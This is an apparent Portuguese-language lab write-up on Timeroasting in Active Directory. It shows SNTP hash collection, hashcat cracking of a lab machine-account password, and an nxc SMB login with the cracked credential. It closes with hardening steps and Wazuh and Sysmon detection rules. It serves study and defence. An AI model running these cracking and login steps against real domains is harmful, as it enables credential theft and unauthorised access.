# 📚 O que é Timeroasting?
Timeroasting é uma técnica de ataque que aproveita a implementação da Microsoft do Protocolo de Tempo Simples de Rede (SNTP) autenticado. Os computadores do domínio usam esta versão autenticada do NTP para evitar ataques de suplantação de horário.

- Como funciona?

Os domain controllers fazem hash das respostas NTP usando o hash NT da conta do computador

Quando um cliente envia uma solicitação NTP com um RID de uma conta de computador, o DC responde com um checksum calculado com a senha dessa conta

Um atacante não autenticado pode enviar solicitações NTP especialmente criadas para obter esses hashes

Os hashes obtidos podem ser quebrados offline com Hashcat (modo 31300)



┌─────────────────┐     1. Enviar solicitações NTP com RIDs
│   Linux         │  ──────────────────────────────────┐
│   (Atacante)    │                                    ▼
└─────────────────┘                              ┌─────────────┐
         │                                       │  windows AD │
         │                                       │   (NTP)     │
         │                                       └─────────────┘
         │                                              │
         │ 2. Coletar hashes dos RIDs 1000-2000         │
         │ ◄────────────────────────────────────────────┘
         ▼
┌──────────────────────┐
│ timeroast_hashes.txt │
│ 1001:$sntp-ms$...    │
│ 1105:$sntp-ms$...    │
│ 1123:$sntp-ms$...    │
└──────────────────────┘
         │
         │ 3. Cruzar RIDs com nomes (se tiver acesso)
         ▼
┌─────────────────┐     4. Quebrar hashes com Hashcat
│ Hashcat -m 31300│ ───────────────────────────────────────┐
└─────────────────┘                                        ▼
                                                    ┌─────────────┐
                                                    │  Senhas     │
                                                    │ spiderman$   │
                                                    │ thepunisher$ │
                                                    │ hydra-dc$    │
                                                    └─────────────┘

## Configuracao

Se esse comando funcionar (não der erro de timeout), significa que o NTP está acessível e o ataque é possível tecnicamente
```
PS C:\Users\frankcastle> w32tm /stripchart /computer:HYDRA-DC.MARVEL.local /samples:1 /dataonly
Tracking HYDRA-DC.MARVEL.local [192.168.0.40:123].
Collecting 1 samples.
The current time is 2/23/2026 12:05:15 AM.
00:05:15, +00.2621639s
```

Se falhar:
```
# Verificar se o firewall do DC permite UDP 123
Test-NetConnection -ComputerName HYDRA-DC.MARVEL.local -Port 123 -Protocol UDP

# Verificar se o serviço W32Time está rodando no DC
# (isso você faz no HYDRA-DC ou perguntando ao admin)
Get-Service w32time | Format-List
```
 Entender a "vulnerabilidade" que precisamos
O Timeroasting só é útil se existirem contas de computador com senhas fracas no domínio . Como isso acontece?

## 🚀 PASSO A PASSO DO ATAQUE

<img width="1586" height="168" alt="timeroastingNXC" src="https://github.com/user-attachments/assets/870460d4-faa8-434f-a535-90c273748443" />

- Crack hashes sntp
```
miguel~ cat sntp.hashes 
$sntp-ms$8b42e5f86d256447e68202b6a142eb72$1c0111e900000000000a0bb34c4f434ced4641eb76f32a2ee1b8428bffbfcd0aed465158aaeadad4ed465158aaeb0673
$sntp-ms$1ce89777512403b54ce49708cbac2e47$1c0111e900000000000a0bb34c4f434ced4641eb79fd9efce1b8428bffbfcd0aed46515945c4270bed46515945c45458
$sntp-ms$a978b5013bec73f63d72c7d0d1c1cd3c$1c0111e900000000000a0bb34c4f434ced4641eb7a63c74fe1b8428bffbfcd0aed465159462a4c03ed465159462a7cab
$sntp-ms$083cf655d289784a2e58fa8c5bb41d19$1c0111e900000000000a0bb44c4f434ced4641eb77f8b157e1b8428bffbfcd0aed46515947d7c7d2ed46515947d800dd
$sntp-ms$38fc91be264ea618f058212fc89981a9$1c0111e900000000000a0bb44c4f434ced4641eb780fd3b2e1b8428bffbfcd0aed4651594fde8b3bed4651594fdebd90

miguel~ hashcat -m 31300 -a 0 sntp.hashes /opt/SecLists/Passwords/rockyou.txt --username
$sntp-ms$1ce89777512403b54ce49708cbac2e47$1c0111e900000000000a0bb34c4f434ced4641eb79fd9efce1b8428bffbfcd0aed46515945c4270bed46515945c45458:spiderman123
```
```
miguel~ nxc smb SPIDERMAN.MARVEL.local -u 'SPIDERMAN$' -p 'spiderman123' 
SMB         192.168.0.191   445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:None)
SMB         192.168.0.191   445    SPIDERMAN        [+] MARVEL.local\SPIDERMAN$:spiderman123
```
E ai dependendo dos privilegios pode entrar por smb, winrm, rdp ou tentar listar por ACL, delegacoes, etc.

## 🛡️ Proteções contra Timeroasting
1. Identificar computadores com senhas antigas (vulneráveis)
```
$dataLimite = (Get-Date).AddDays(-30)
Get-ADComputer -Filter "PasswordLastSet -lt '$dataLimite'" -Properties Name, PasswordLastSet | 
    Format-Table Name, PasswordLastSet -AutoSize

#Forçar troca de senha em computadores antigos
Get-ADComputer -Filter "PasswordLastSet -lt '$dataLimite'" | 
    ForEach-Object { Set-ADComputer -Identity $_.DistinguishedName -PasswordLastSet $null }
```
2. Bloquear NTP anônimo
```
 #No DC, configurar o serviço W32Time para não responder a consultas anônimas
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /v AllowNonauthenticatedTimeProviders /t REG_DWORD /d 0 /f

# Reiniciar o serviço
net stop w32time && net start w32time
```
3. Monitorar eventos de NTP
```
# Habilitar logging avançado no DC
# Ver Eventos do Sistema por ID 134 (NTP)
Get-WinEvent -LogName System | Where-Object { $_.Id -eq 134 } | Select-Object -First 10
```


## 🔍 Detecção com Wazuh

```
<group name="windows,ntp,timeroasting,">
  <!-- Detectar múltiplas conexões UDP na porta 123 -->
  <rule id="100005" level="8">
    <if_sid>60006</if_sid>
    <field name="win.system.eventID">5156</field>
    <field name="win.eventdata.DestinationPort">123</field>
    <field name="win.eventdata.Protocol">17</field>
    <description>Conexão NTP detectada de $(win.eventdata.SourceAddress)</description>
    <group>timeroasting,</group>
  </rule>

  <!-- Alerta quando muitas conexões NTP em curto período -->
  <rule id="100006" level="12" frequency="30" timeframe="60">
    <if_matched_sid>100005</if_matched_sid>
    <description>ALERTA: Possível ataque Timeroasting - Múltiplas solicitações NTP</description>
    <group>timeroasting_attack,</group>
  </rule>
</group>
```
## Configuração do Sysmon para detectar Timeroasting
```
<!-- No arquivo de configuração do Sysmon -->
<Sysmon>
  <EventFiltering>
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="include">
        <DestinationPort condition="is">123</DestinationPort>
        <Protocol condition="is">17</Protocol>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```
